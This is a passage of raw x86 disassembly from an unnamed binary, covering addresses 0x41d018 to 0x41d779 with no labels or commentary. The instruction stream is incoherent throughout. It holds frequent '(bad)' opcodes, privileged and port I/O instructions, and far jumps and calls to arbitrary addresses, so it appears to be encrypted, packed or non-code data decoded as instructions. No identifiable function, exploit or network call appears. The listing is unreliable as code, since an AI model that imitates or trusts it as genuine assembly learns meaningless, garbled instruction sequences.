  41d018:	test   BYTE PTR [eax-0x78d525cc],al
  41d01e:	mov    al,0x8d
  41d020:	sub    esi,DWORD PTR [ebx-0x11]
  41d023:	sar    DWORD PTR [ecx],1
  41d025:	xchg   edx,eax
  41d026:	(bad)  
  41d027:	nop
  41d028:	dec    eax
  41d029:	(bad)  
  41d02a:	mov    ecx,0x4fb08806
  41d02f:	lods   eax,DWORD PTR ds:[esi]
  41d030:	scas   eax,DWORD PTR es:[edi]
  41d031:	pop    ecx
  41d032:	mov    gs,WORD PTR [ecx]
  41d034:	imul   eax,esp,0x57
  41d037:	scas   al,BYTE PTR es:[edi]
  41d038:	mov    al,ds:0x8663eaa2
  41d03d:	pop    edi
  41d03e:	test   al,0x5
  41d040:	push   edi
  41d041:	jno    0x41d0a7
  41d043:	jns    0x41d0c1
  41d045:	and    DWORD PTR [edx+0x14],edx
  41d048:	les    edx,FWORD PTR [esp+ebx*2]
  41d04b:	mov    bl,dh
  41d04d:	out    dx,eax
  41d04e:	inc    ebp
  41d04f:	ret    0x6083
  41d052:	ror    esp,0xaf
  41d055:	int3   
  41d056:	(bad)  
  41d057:	push   ds
  41d058:	cs and eax,0xf380eba3
  41d05e:	outs   dx,BYTE PTR ds:[esi]
  41d05f:	(bad)  
  41d060:	scas   eax,DWORD PTR es:[edi]
  41d061:	push   ebp
  41d062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d063:	sub    ecx,esi
  41d065:	fst    st(3)
  41d067:	and    eax,0x6ef4e412
  41d06c:	test   BYTE PTR [edx-0x47],ah
  41d06f:	sbb    eax,DWORD PTR [edx]
  41d071:	jg     0x41d0ac
  41d073:	pop    edx
  41d074:	cmp    DWORD PTR [ebx-0xc12b728],ecx
  41d07a:	lock inc edi
  41d07c:	std    
  41d07d:	sub    al,BYTE PTR [edx-0x7]
  41d080:	leave  
  41d081:	pop    esi
  41d082:	add    eax,0x299c942d
  41d087:	and    eax,0xb82f5f76
  41d08c:	jmp    0x92ca26ff
  41d091:	and    eax,0x8d77ff9a
  41d096:	imul   edi,ecx,0xffffff89
  41d099:	bound  esi,QWORD PTR [ebp-0x54260a7f]
  41d09f:	sub    ah,ch
  41d0a1:	arpl   WORD PTR [edi+eax*4+0x50e5b463],bx
  41d0a8:	test   DWORD PTR [esi+0x42],edx
  41d0ab:	jbe    0x41d129
  41d0ad:	pop    ss
  41d0ae:	jnp    0x41d035
  41d0b0:	xchg   ecx,eax
  41d0b1:	into   
  41d0b2:	jmp    0x41d0dc
  41d0b4:	and    al,cl
  41d0b6:	iret   
  41d0b7:	lahf   
  41d0b8:	fldl2t 
  41d0ba:	pop    edx
  41d0bb:	jns    0x41d068
  41d0bd:	mov    BYTE PTR [ebx],dh
  41d0bf:	push   esi
  41d0c0:	es jno 0x41d10f
  41d0c3:	scas   al,BYTE PTR es:[edi]
  41d0c4:	cdq    
  41d0c5:	aaa    
  41d0c6:	mov    cl,0xc
  41d0c8:	pop    ds
  41d0c9:	leave  
  41d0ca:	jae    0x41d12e
  41d0cc:	mov    edi,0xafb17bb1
  41d0d1:	call   0x6c86e7fe
  41d0d6:	and    edx,eax
  41d0d8:	call   0xf815:0x824770ce
  41d0df:	or     esi,DWORD PTR [ebx+0x34]
  41d0e2:	mov    al,ds:0xafa2d13e
  41d0e7:	out    dx,al
  41d0e8:	stos   DWORD PTR es:[edi],eax
  41d0e9:	nop
  41d0ea:	ins    BYTE PTR es:[edi],dx
  41d0eb:	jge    0x41d167
  41d0ed:	pop    esp
  41d0ee:	shr    BYTE PTR [esi-0x167c102c],1
  41d0f4:	xor    eax,0x50b2ea0a
  41d0f9:	aad    0x1e
  41d0fb:	int3   
  41d0fc:	fdivr  QWORD PTR [esi-0x25]
  41d0ff:	sub    al,0x89
  41d101:	jge    0x41d08c
  41d103:	fwait
  41d104:	rol    BYTE PTR [edi],1
  41d106:	out    dx,eax
  41d107:	rol    BYTE PTR [edi-0x504eca55],1
  41d10d:	pop    ds
  41d10e:	imul   ebp,DWORD PTR [eax+0x42],0xffffffc2
  41d112:	dec    esi
  41d113:	push   ebp
  41d114:	jno    0x41d193
  41d116:	inc    esi
  41d117:	jmp    0xe648:0x189aff99
  41d11e:	ins    DWORD PTR es:[edi],dx
  41d11f:	inc    edi
  41d120:	mov    esi,ecx
  41d122:	push   DWORD PTR [edi+0x0]
  41d125:	xchg   ebp,eax
  41d126:	in     eax,dx
  41d127:	lock sbb DWORD PTR [esi],0xaef2ac0d
  41d12e:	into   
  41d12f:	add    al,0x1b
  41d131:	les    esp,FWORD PTR [eax-0x4816a385]
  41d137:	pop    ebx
  41d138:	inc    ebp
  41d139:	xlat   BYTE PTR ds:[ebx]
  41d13a:	mov    ah,0x83
  41d13c:	sub    BYTE PTR [ecx-0x77c4560],ah
  41d142:	out    dx,al
  41d143:	call   0xcc4c1279
  41d148:	pop    es
  41d149:	gs or  al,0x9b
  41d14c:	mov    bl,0x4e
  41d14e:	jg     0x41d0fc
  41d150:	repnz inc esi
  41d152:	cmp    BYTE PTR [edi-0x23],cl
  41d155:	mov    cl,BYTE PTR [esi]
  41d157:	repnz pop edi
  41d159:	xchg   ebp,eax
  41d15a:	jae    0x41d177
  41d15c:	loope  0x41d152
  41d15e:	dec    ebp
  41d15f:	sti    
  41d160:	leave  
  41d161:	pop    ebp
  41d162:	cs imul esi,ecx,0xffffff95
  41d166:	icebp  
  41d167:	mov    esp,0x7aba09a2
  41d16c:	loopne 0x41d135
  41d16e:	inc    edx
  41d16f:	test   BYTE PTR [esi],dh
  41d171:	data16 int3 
  41d173:	(bad)  
  41d174:	int3   
  41d175:	jmp    0x8d98f339
  41d17a:	icebp  
  41d17b:	rol    DWORD PTR ds:0x581ac89d,cl
  41d181:	or     eax,0xd617c634
  41d186:	dec    edi
  41d187:	or     eax,0x89c6d6e4
  41d18c:	hlt    
  41d18d:	and    eax,0x3f41064e
  41d192:	sub    edi,edi
  41d194:	dec    ebp
  41d195:	jle    0x41d11b
  41d197:	repz jge 0x41d161
  41d19a:	mov    al,ds:0x39a90bfb
  41d19f:	xor    BYTE PTR [edx-0x4b],dl
  41d1a2:	aam    0xe7
  41d1a4:	pop    esp
  41d1a5:	push   esi
  41d1a6:	xchg   edx,eax
  41d1a7:	and    bh,BYTE PTR [ebx]
  41d1a9:	mov    dl,0x15
  41d1ab:	cmp    bl,dl
  41d1ad:	pop    edx
  41d1ae:	aam    0xee
  41d1b0:	aad    0xe9
  41d1b2:	call   0xa605:0xcdea989b
  41d1b9:	sbb    DWORD PTR [edx-0x45c6357a],ecx
  41d1bf:	fld    TBYTE PTR [edx-0x4cb2bc59]
  41d1c5:	sub    DWORD PTR [ecx],ebx
  41d1c7:	aam    0xc6
  41d1c9:	jno    0x41d185
  41d1cb:	xor    eax,0x13433b43
  41d1d0:	pop    eax
  41d1d1:	sub    BYTE PTR [edi-0x1eae68f0],bl
  41d1d7:	inc    esi
  41d1d8:	xchg   ebx,eax
  41d1d9:	and    DWORD PTR [ebx],ebp
  41d1db:	jb     0x41d1bd
  41d1dd:	inc    ebp
  41d1de:	cmc    
  41d1df:	xchg   esp,eax
  41d1e0:	add    eax,0x1805258e
  41d1e5:	dec    edx
  41d1e6:	pop    eax
  41d1e7:	stos   BYTE PTR es:[edi],al
  41d1e8:	xchg   ebp,edx
  41d1ea:	ja     0x41d228
  41d1ec:	jnp    0x41d258
  41d1ee:	mov    edx,0xf3b720cb
  41d1f3:	ds pop edx
  41d1f5:	nop
  41d1f6:	mov    edx,0xbfe3e981
  41d1fb:	jmp    0x5015:0x5b80e4d9
  41d202:	pop    edi
  41d203:	dec    edi
  41d204:	out    dx,eax
  41d205:	and    al,0x9d
  41d207:	dec    eax
  41d208:	addr16 enter 0x314e,0xc
  41d20d:	adc    edi,DWORD PTR [eax-0x1acc5466]
  41d213:	jge    0x41d221
  41d215:	sbb    edi,ebx
  41d217:	add    edx,DWORD PTR [ebp-0x5b19c11d]
  41d21d:	fwait
  41d21e:	int3   
  41d21f:	sbb    ah,BYTE PTR [ebx+eax*4-0x5f]
  41d223:	jb     0x41d1bc
  41d225:	dec    edx
  41d226:	xchg   BYTE PTR [edi+0x48780f1c],bl
  41d22c:	(bad)  [ecx]
  41d22e:	mov    dl,0xa4
  41d230:	std    
  41d231:	stos   BYTE PTR es:[edi],al
  41d232:	inc    ebp
  41d233:	mov    esp,0x3e8bd867
  41d238:	cwde   
  41d239:	mov    cl,0xbe
  41d23b:	je     0x41d285
  41d23d:	xchg   ebx,eax
  41d23e:	retf   0x18c4
  41d241:	aad    0xed
  41d243:	xor    ebp,DWORD PTR [eax]
  41d245:	shl    bh,0x63
  41d248:	push   esp
  41d249:	or     eax,0xc6d9a8bb
  41d24e:	outs   dx,BYTE PTR ds:[esi]
  41d24f:	adc    al,0x4d
  41d251:	mov    esp,ds
  41d253:	push   ss
  41d254:	mov    ebx,0x3d5c645a
  41d259:	mov    dh,0x9
  41d25b:	mov    eax,ds:0x937bc4ec
  41d260:	and    dh,BYTE PTR [edx]
  41d262:	adc    BYTE PTR [esi],0x41
  41d265:	ja     0x41d240
  41d267:	retf   0x2bab
  41d26a:	(bad)
  41d26d:	rol    BYTE PTR [eax+0x7c],0x9f
  41d271:	je     0x41d240
  41d273:	out    dx,al
  41d274:	rcr    BYTE PTR [eax+0x2a],0xdc
  41d278:	mov    bh,0xcf
  41d27a:	add    edi,esp
  41d27c:	enter  0x4f94,0x33
  41d280:	push   ss
  41d281:	std    
  41d282:	dec    edi
  41d283:	dec    ebp
  41d284:	sbb    DWORD PTR [edi-0x76ad8be7],esp
  41d28a:	mov    ecx,0x6882ab0b
  41d28f:	fdivr  QWORD PTR [ebx+0x4]
  41d292:	es push cs
  41d294:	mov    ebx,0xcd7d75d0
  41d299:	add    eax,0x2b5142d1
  41d29e:	push   cs
  41d29f:	js     0x41d303
  41d2a1:	xchg   esp,eax
  41d2a2:	fidiv  DWORD PTR [edi-0x340dc5d]
  41d2a8:	pop    edi
  41d2a9:	inc    ecx
  41d2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2ab:	pop    ebp
  41d2ac:	push   cs
  41d2ad:	ret    0xec9b
  41d2b0:	fist   DWORD PTR [di+0x5c]
  41d2b4:	mov    ebx,0xaa42a92f
  41d2b9:	mov    ah,0xbd
  41d2bb:	into   
  41d2bc:	xchg   BYTE PTR [eax],cl
  41d2be:	imul   eax,DWORD PTR [ebx-0x60],0xffffffde
  41d2c2:	cmc    
  41d2c3:	xor    DWORD PTR [eax],ebp
  41d2c5:	(bad)  
  41d2c6:	mov    edx,0x272102ee
  41d2cb:	je     0x41d325
  41d2cd:	pusha  
  41d2ce:	je     0x41d34c
  41d2d0:	enter  0x642d,0xb1
  41d2d4:	fdiv   st(6),st
  41d2d6:	int3   
  41d2d7:	xchg   DWORD PTR [ebp-0x42],edi
  41d2da:	ins    BYTE PTR es:[edi],dx
  41d2db:	add    DWORD PTR gs:[eax],ecx
  41d2de:	and    DWORD PTR [eax-0xf],edi
  41d2e1:	sub    DWORD PTR [bx+si-0x38],esi
  41d2e5:	inc    ebx
  41d2e6:	sub    al,0x91
  41d2e8:	and    bl,al
  41d2ea:	dec    eax
  41d2eb:	mov    ah,BYTE PTR [eax+0x1b]
  41d2ee:	lods   al,BYTE PTR ds:[esi]
  41d2ef:	inc    ecx
  41d2f0:	ins    DWORD PTR es:[edi],dx
  41d2f1:	and    eax,0xedfef975
  41d2f6:	stos   DWORD PTR es:[edi],eax
  41d2f7:	mov    DWORD PTR [ebp+0x2b],ebx
  41d2fa:	ret    0x7d
  41d2fd:	mov    eax,0x8ec492b9
  41d302:	call   FWORD PTR [eax-0x33]
  41d305:	cmp    bl,dh
  41d307:	nop
  41d308:	cmp    al,0xbb
  41d30a:	mov    ah,0x58
  41d30c:	cmp    DWORD PTR [edx],0x34
  41d30f:	in     eax,dx
  41d310:	lahf   
  41d311:	dec    esi
  41d312:	in     al,0xa1
  41d314:	mov    eax,0x93b392b5
  41d319:	sbb    ah,BYTE PTR [edi+0x24]
  41d31c:	lea    eax,[edx+ebx*4+0x179d3d5a]
  41d323:	hlt    
  41d324:	popa   
  41d325:	push   ebp
  41d326:	retf   0x7b4f
  41d329:	push   eax
  41d32a:	daa    
  41d32b:	mov    bl,0x7e
  41d32d:	in     al,0xe8
  41d32f:	int    0x66
  41d331:	push   esi
  41d332:	pop    ecx
  41d333:	(bad)  
  41d334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d335:	xor    DWORD PTR [edi],0xffffff9c
  41d338:	fiadd  WORD PTR [ebx-0x26]
  41d33b:	mov    bl,0xdf
  41d33d:	mov    ecx,0x9eb673cc
  41d342:	jge    0x41d370
  41d344:	sub    BYTE PTR [eax-0x210d3818],al
  41d34a:	sub    BYTE PTR [esp+esi*8],bl
  41d34d:	dec    edi
  41d34e:	in     al,0x3a
  41d350:	mov    ebx,0xf0337330
  41d355:	dec    eax
  41d356:	fst    st(3)
  41d358:	hlt    
  41d359:	mov    ?,WORD PTR [edx]
  41d35b:	push   cs
  41d35c:	xor    al,0x7a
  41d35e:	mov    dh,0x5c
  41d360:	dec    edx
  41d361:	iret   
  41d362:	shl    BYTE PTR [edx-0x10],0xc3
  41d366:	(bad)  
  41d367:	jle    0x41d330
  41d369:	jbe    0x41d349
  41d36b:	dec    ebx
  41d36c:	ins    BYTE PTR es:[edi],dx
  41d36d:	pop    ebp
  41d36e:	das    
  41d36f:	mov    edi,esp
  41d371:	iret   
  41d372:	pop    esp
  41d373:	fsub   DWORD PTR [edi+0x7c]
  41d376:	lea    eax,[edx+0x31]
  41d379:	adc    eax,eax
  41d37b:	dec    ecx
  41d37c:	cmc    
  41d37d:	mov    dl,0xfc
  41d37f:	mov    WORD PTR [ebx-0x16],cs
  41d382:	mov    edx,0x964b2f5b
  41d387:	cmc    
  41d388:	es aas 
  41d38a:	add    BYTE PTR [edx],bh
  41d38c:	mov    ds:0x3e8b2c60,al
  41d391:	inc    ebx
  41d392:	push   edi
  41d393:	inc    edx
  41d394:	shl    BYTE PTR [edx+eax*8+0x2559748f],0xdc
  41d39c:	push   esi
  41d39d:	and    esi,DWORD PTR [edx+0x6ce93ce2]
  41d3a3:	das    
  41d3a4:	into   
  41d3a5:	lahf   
  41d3a6:	add    esp,DWORD PTR [ecx-0x3105dc4d]
  41d3ac:	js     0x41d3fe
  41d3ae:	or     eax,0x81a926e7
  41d3b3:	repz mov WORD PTR [ebx+0x35],es
  41d3b7:	sahf   
  41d3b8:	sub    cl,bl
  41d3ba:	shl    DWORD PTR [ecx],0x15
  41d3bd:	mov    ecx,0x59ab9ad8
  41d3c2:	or     DWORD PTR ds:0x2b585262,0x1040248c
  41d3cc:	pop    ebp
  41d3cd:	arpl   WORD PTR [eax+0x9],bp
  41d3d0:	sbb    BYTE PTR [eax-0x7e],bh
  41d3d3:	inc    edx
  41d3d4:	and    cl,0x82
  41d3d7:	or     esi,eax
  41d3d9:	ficomp DWORD PTR [edi]
  41d3db:	shl    BYTE PTR [ecx-0x75],0xd9
  41d3df:	adc    al,0x7e
  41d3e1:	fimul  DWORD PTR [ebp+0x47]
  41d3e4:	pushf  
  41d3e5:	lea    eax,[eax+0x6c]
  41d3e8:	test   DWORD PTR [eax],0x920a0a67
  41d3ee:	(bad)  
  41d3ef:	(bad)  
  41d3f0:	frstor [edi-0x6c]
  41d3f3:	mov    WORD PTR [esp+ebx*1],ds
  41d3f6:	lds    edx,FWORD PTR [ecx]
  41d3f8:	add    al,0x4f
  41d3fa:	out    dx,eax
  41d3fb:	mov    eax,0xaff87298
  41d400:	inc    DWORD PTR [ebp+0x175fc6af]
  41d406:	sbb    ebx,esp
  41d408:	push   edi
  41d409:	mov    ds:0x190df02a,al
  41d40e:	inc    edi
  41d40f:	aaa    
  41d410:	xchg   ebx,eax
  41d411:	jne    0x41d426
  41d413:	mov    ds,WORD PTR [ecx+0x775aa764]
  41d419:	call   0x2b2af7ef
  41d41e:	sahf   
  41d41f:	adc    ch,dl
  41d421:	mov    DWORD PTR ds:0x4c5ada3d,edx
  41d427:	outs   dx,BYTE PTR ds:[esi]
  41d428:	daa    
  41d429:	daa    
  41d42a:	imul   edi,DWORD PTR [esi-0x38],0xc6f415c9
  41d431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d432:	enter  0x98b,0xb0
  41d436:	mov    edx,0xb9aac0c3
  41d43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d43c:	or     ah,dl
  41d43e:	or     BYTE PTR [ebx-0x6c9c113e],dl
  41d444:	in     eax,dx
  41d445:	and    dl,BYTE PTR [esi-0x75]
  41d448:	mov    ebp,DWORD PTR [ebx]
  41d44a:	rcl    ebx,1
  41d44c:	xor    ah,cl
  41d44e:	leave  
  41d44f:	mov    ds:0xf078998a,al
  41d454:	adc    dl,dl
  41d456:	ret    
  41d457:	std    
  41d458:	jle    0x41d467
  41d45a:	xor    DWORD PTR [eax-0x5df20d9a],ecx
  41d460:	dec    BYTE PTR [ebx+0x41]
  41d463:	sub    BYTE PTR [eax+0x23],ah
  41d466:	dec    edx
  41d467:	sub    ch,al
  41d469:	sbb    DWORD PTR [eax-0x436a817f],esp
  41d46f:	and    DWORD PTR ds:0xde3ef41a,ecx
  41d475:	pop    ebx
  41d476:	pop    ebx
  41d477:	add    eax,0x68216f3e
  41d47c:	repz test eax,0x924d07eb
  41d482:	retw   
  41d484:	cmp    esi,edx
  41d486:	mov    al,ds:0x7e93c002
  41d48b:	jl     0x41d468
  41d48d:	add    esi,DWORD PTR [edi]
  41d48f:	fwait
  41d490:	ja     0x41d4c8
  41d492:	jmp    0x41d43c
  41d494:	int    0xd
  41d496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d497:	out    0x81,al
  41d499:	sar    bl,cl
  41d49b:	popa   
  41d49c:	cmp    ah,BYTE PTR [ebp-0x650cd6c8]
  41d4a2:	inc    edx
  41d4a3:	fiadd  DWORD PTR [esi+0x14e1eba9]
  41d4a9:	adc    esi,DWORD PTR [esi]
  41d4ab:	jae    0x41d480
  41d4ad:	mov    eax,0xd50df38a
  41d4b2:	jle    0x41d44b
  41d4b4:	(bad)  
  41d4b5:	inc    edi
  41d4b6:	shl    DWORD PTR [edi-0x18],cl
  41d4b9:	mov    ebp,0x53d98df
  41d4be:	es hlt 
  41d4c0:	test   dh,dl
  41d4c2:	dec    edi
  41d4c3:	pop    edx
  41d4c4:	and    BYTE PTR [edi+0x46],dh
  41d4c7:	xchg   esi,eax
  41d4c8:	addr16 aad 0xa
  41d4cb:	lds    ecx,FWORD PTR [edi+0x37]
  41d4ce:	jmp    0x41d513
  41d4d0:	(bad)  
  41d4d4:	adc    ax,0x7c66
  41d4d8:	cdq    
  41d4d9:	(bad)  
  41d4da:	hlt    
  41d4db:	sbb    eax,0x447a59f9
  41d4e0:	add    edi,ebp
  41d4e2:	add    al,0x6a
  41d4e4:	xor    ebp,DWORD PTR [ebx+0x4f87fbd6]
  41d4ea:	ss mov bh,0x8d
  41d4ed:	js     0x41d4ae
  41d4ef:	mov    eax,0x83ee9dc3
  41d4f4:	scas   eax,DWORD PTR es:[edi]
  41d4f5:	loope  0x41d543
  41d4f7:	ret    
  41d4f8:	jl     0x41d558
  41d4fa:	jns    0x41d4e6
  41d4fc:	sub    esi,ebx
  41d4fe:	mov    BYTE PTR [edi],bh
  41d500:	pusha  
  41d501:	into   
  41d502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d503:	sub    ah,BYTE PTR [eax]
  41d505:	mov    ebx,0x7ae19567
  41d50a:	scas   eax,DWORD PTR es:[edi]
  41d50b:	or     ch,al
  41d50d:	ret    
  41d50e:	nop
  41d50f:	xchg   ebx,eax
  41d510:	fist   WORD PTR [esi-0x1e0f7be4]
  41d516:	push   ebx
  41d517:	retf   0x283
  41d51a:	push   ds
  41d51b:	sub    dl,BYTE PTR [ebx+0x4901e4f6]
  41d521:	pop    ebx
  41d522:	sub    DWORD PTR [edi],ebx
  41d524:	add    eax,0x4e5bf258
  41d529:	cmp    eax,DWORD PTR [edx-0xf]
  41d52c:	test   DWORD PTR [eax+0x5f2e4cbe],esi
  41d532:	jle    0x41d4bc
  41d534:	sub    ch,bl
  41d536:	mov    dh,0x2e
  41d538:	mov    dl,0xbb
  41d53a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d53b:	addr16 inc esp
  41d53d:	fstp   TBYTE PTR [ecx]
  41d53f:	jmp    0x41d5b6
  41d541:	xchg   DWORD PTR [esp+eiz*2+0x10004063],esi
  41d548:	push   0x53
  41d54a:	dec    esi
  41d54b:	and    ebp,DWORD PTR [edi+0x2aba99ca]
  41d551:	dec    edi
  41d552:	xor    esp,0x2c
  41d555:	xchg   DWORD PTR [edx],edi
  41d557:	add    DWORD PTR [ecx-0x68d8a06b],ecx
  41d55d:	fisttp WORD PTR [edx]
  41d55f:	(bad)  
  41d560:	not    BYTE PTR [ecx]
  41d562:	ret    0x9dca
  41d565:	jl     0x41d5df
  41d567:	retf   0x7898
  41d56a:	ret    
  41d56b:	daa    
  41d56c:	ins    BYTE PTR es:[edi],dx
  41d56d:	ins    BYTE PTR es:[edi],dx
  41d56e:	cmp    BYTE PTR [esi+0x340c8778],cl
  41d574:	add    DWORD PTR [ecx+0xbb3d44d],ebp
  41d57a:	imul   ebx,DWORD PTR [esi],0xd448e2bd
  41d580:	lods   eax,DWORD PTR ds:[esi]
  41d581:	ins    BYTE PTR es:[edi],dx
  41d582:	daa    
  41d583:	int3   
  41d584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d585:	push   edx
  41d586:	aas    
  41d587:	pushf  
  41d588:	in     al,0x78
  41d58a:	add    BYTE PTR [edi+ebx*2+0x53],al
  41d58e:	lea    eax,[ecx+0xa08047a]
  41d594:	xor    eax,0x64bcc8e2
  41d599:	ficom  WORD PTR [esi+0x267724f9]
  41d59f:	fcmovne st,st(3)
  41d5a1:	or     edx,DWORD PTR [edx]
  41d5a3:	or     eax,DWORD PTR [edx-0x71]
  41d5a6:	xchg   DWORD PTR [esp+esi*2+0x924dddb],ebp
  41d5ad:	outs   dx,DWORD PTR ds:[esi]
  41d5ae:	and    eax,eax
  41d5b0:	sahf   
  41d5b1:	mov    ecx,0xbb6d0232
  41d5b6:	loopne 0x41d544
  41d5b8:	(bad)  
  41d5ba:	fmul   DWORD PTR [ebp+0x5b]
  41d5bd:	inc    esi
  41d5be:	cmp    BYTE PTR [ebp-0x5b],bl
  41d5c1:	ins    BYTE PTR es:[edi],dx
  41d5c2:	div    DWORD PTR [eax]
  41d5c4:	jmp    0xbc5b537a
  41d5c9:	jne    0x41d5bb
  41d5cb:	inc    ecx
  41d5cc:	aas    
  41d5cd:	into   
  41d5ce:	stc    
  41d5cf:	mov    ch,0xa1
  41d5d1:	jne    0x41d5a2
  41d5d3:	dec    BYTE PTR [ebp-0x79]
  41d5d6:	pop    edx
  41d5d7:	pop    ebx
  41d5d8:	fwait
  41d5d9:	add    ecx,0xffffffb4
  41d5dc:	fidivr DWORD PTR [ebx-0x284bbadb]
  41d5e2:	test   BYTE PTR [eax],0x3
  41d5e5:	iret   
  41d5e6:	int3   
  41d5e7:	pop    ecx
  41d5e8:	aaa    
  41d5e9:	scas   al,BYTE PTR es:[edi]
  41d5ea:	pusha  
  41d5eb:	xchg   ebx,eax
  41d5ec:	sahf   
  41d5ed:	js     0x41d658
  41d5ef:	(bad)  
  41d5f0:	and    al,0x85
  41d5f2:	icebp  
  41d5f3:	push   ds
  41d5f4:	xor    eax,0xba6ea4f7
  41d5f9:	inc    edi
  41d5fa:	fwait
  41d5fb:	lods   al,BYTE PTR ds:[esi]
  41d5fc:	out    dx,al
  41d5fd:	mov    ah,0x27
  41d5ff:	add    dh,cl
  41d601:	add    eax,0x67053926
  41d606:	hlt    
  41d607:	mov    ecx,0x64005a9f
  41d60c:	pop    ds
  41d60d:	mov    ds:0xbd61e72f,al
  41d612:	in     eax,dx
  41d613:	sub    dh,BYTE PTR [edi]
  41d615:	push   ebp
  41d616:	inc    edi
  41d617:	gs pusha 
  41d619:	rcr    BYTE PTR [edx],cl
  41d61b:	mov    ch,0x1c
  41d61d:	rcr    dl,0x14
  41d620:	xchg   ebx,eax
  41d621:	mov    ch,0x65
  41d623:	mov    bh,0xb1
  41d625:	sbb    al,0xad
  41d627:	inc    edx
  41d628:	cld    
  41d629:	push   es
  41d62a:	fcom   QWORD PTR [ecx+edx*2+0x683b3c0d]
  41d631:	lahf   
  41d632:	stos   BYTE PTR es:[edi],al
  41d633:	push   edx
  41d635:	mov    dl,0xcc
  41d637:	xchg   edx,eax
  41d638:	xor    bh,BYTE PTR [ebx+ecx*4]
  41d63b:	mov    eax,ds:0xa36a35
  41d640:	lea    edi,[ebx+0x3d]
  41d643:	jne    0x41d6a7
  41d645:	xor    esp,edi
  41d647:	repnz xor esi,edx
  41d64a:	dec    esp
  41d64b:	xchg   BYTE PTR [ecx-0xa7b0fae],cl
  41d651:	xchg   esi,eax
  41d652:	lahf   
  41d653:	test   DWORD PTR [ebx+0x6b869dee],esi
  41d659:	push   ecx
  41d65a:	sub    DWORD PTR [ecx+0x65],ebx
  41d65d:	inc    esp
  41d65e:	pushf  
  41d65f:	sub    al,0xca
  41d661:	cwde   
  41d662:	outs   dx,BYTE PTR ds:[esi]
  41d663:	push   ds
  41d664:	adc    BYTE PTR [ecx-0x1a],0x41
  41d668:	and    eax,0x643272e3
  41d66d:	(bad)  
  41d66e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d66f:	inc    esp
  41d670:	mov    ah,dl
  41d672:	push   0x4
  41d674:	fwait
  41d675:	mov    ebp,0xec1792a9
  41d67a:	ret    0x43ba
  41d67d:	retf   0x5352
  41d680:	mov    bh,0x7f
  41d682:	fild   QWORD PTR [edx+0x65c32b3b]
  41d688:	pusha  
  41d689:	pusha  
  41d68a:	xor    BYTE PTR [eax-0x19],cl
  41d68d:	push   ds
  41d68e:	daa    
  41d68f:	pop    eax
  41d690:	or     eax,0xc05ce1c
  41d695:	popa   
  41d696:	das    
  41d697:	popf   
  41d698:	aaa    
  41d699:	xor    al,0x6f
  41d69b:	leave  
  41d69c:	call   0x54f5:0x795ca29c
  41d6a3:	int    0x57
  41d6a5:	popf   
  41d6a6:	ror    eax,cl
  41d6a8:	pop    ecx
  41d6a9:	lds    ecx,FWORD PTR [ebp+ecx*8+0x28a23172]
  41d6b0:	xor    eax,0x13c3b77e
  41d6b5:	out    0x25,al
  41d6b7:	add    eax,0xa41c13b9
  41d6bc:	pushf  
  41d6bd:	push   es
  41d6be:	js     0x41d66b
  41d6c0:	push   edi
  41d6c1:	mov    al,0xb4
  41d6c3:	push   cs
  41d6c4:	mov    edx,0x365ff918
  41d6c9:	jg     0x41d659
  41d6cb:	imul   ah
  41d6cd:	and    BYTE PTR [edx],0x4c
  41d6d0:	stos   DWORD PTR es:[edi],eax
  41d6d1:	sbb    al,0xdc
  41d6d3:	dec    edi
  41d6d4:	lea    edx,[ebx-0x49702b50]
  41d6da:	add    BYTE PTR cs:[ebp-0x5],ch
  41d6de:	xchg   edi,eax
  41d6df:	mov    cl,0x74
  41d6e1:	ror    BYTE PTR [ebx-0x4a],0x3f
  41d6e5:	mov    al,dl
  41d6e7:	ins    DWORD PTR es:[edi],dx
  41d6e8:	enter  0x1ae6,0x92
  41d6ec:	xchg   ebp,eax
  41d6ed:	pop    ebp
  41d6ee:	enter  0xd3f0,0x62
  41d6f2:	push   0xa1bf67
  41d6f7:	inc    edx
  41d6f8:	mov    al,ds:0x84ae3a79
  41d6fd:	ins    DWORD PTR es:[edi],dx
  41d6fe:	in     eax,dx
  41d6ff:	bound  edi,QWORD PTR [edi-0x4b79fe56]
  41d705:	stos   DWORD PTR es:[edi],eax
  41d706:	jg     0x41d724
  41d708:	adc    eax,0xf9657b0
  41d70d:	mov    ds:0x94de2425,al
  41d712:	xor    al,0x49
  41d714:	pop    es
  41d715:	jnp    0x41d792
  41d717:	fisttp WORD PTR [eax]
  41d719:	loope  0x41d6bc
  41d71b:	and    eax,0xbd2dd41d
  41d720:	shr    ecx,1
  41d722:	pushf  
  41d723:	dec    ebp
  41d724:	sub    cl,BYTE PTR [esi-0xd8a7440]
  41d72a:	add    al,0xc2
  41d72c:	xchg   ecx,eax
  41d72d:	in     eax,0xf4
  41d72f:	cmc    
  41d730:	aam    0x60
  41d732:	pop    edi
  41d733:	cs mov ah,0x2e
  41d736:	cli    
  41d737:	dec    ebp
  41d738:	cwde   
  41d739:	retf   
  41d73a:	push   edi
  41d73b:	xor    al,0xfb
  41d73d:	add    edx,DWORD PTR [edi]
  41d73f:	sysexit 
  41d741:	dec    esi
  41d742:	fcom   DWORD PTR [edi]
  41d744:	mov    edi,DWORD PTR [edx]
  41d746:	das    
  41d747:	inc    eax
  41d748:	dec    eax
  41d749:	mov    cl,0x45
  41d74b:	test   al,0xd6
  41d74d:	mov    ch,0x2f
  41d74f:	cld    
  41d750:	int    0x29
  41d752:	inc    ebp
  41d753:	out    0x8d,eax
  41d755:	inc    ebx
  41d756:	and    ebp,DWORD PTR [ebx-0x4347d35b]
  41d75c:	shl    DWORD PTR [eax+0x22dfde97],1
  41d762:	sub    BYTE PTR [ebx],bh
  41d764:	push   0x34
  41d766:	sub    eax,DWORD PTR [esi+0x48]
  41d769:	jle    0x41d7ce
  41d76b:	pop    edx
  41d76c:	xor    edx,DWORD PTR [ebx-0x2f79ce4e]
  41d772:	sbb    al,0xaa
  41d774:	or     bl,dl
  41d776:	aad    0x2d
  41d778:	stc    
  41d779:	sbb    esp,DWORD PTR [edi]
